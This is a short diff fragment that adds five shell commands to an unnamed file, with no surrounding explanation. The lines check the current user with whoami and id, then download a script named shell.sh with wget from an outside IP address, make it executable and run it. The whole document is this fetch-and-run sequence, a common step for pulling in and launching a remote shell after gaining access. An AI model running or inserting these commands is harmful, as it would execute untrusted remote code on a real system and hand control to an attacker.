@@ -1,0 +1,5 @@
+whoami
+id
+wget http://198.51.100.77/shell.sh
+chmod +x shell.sh
+./shell.sh
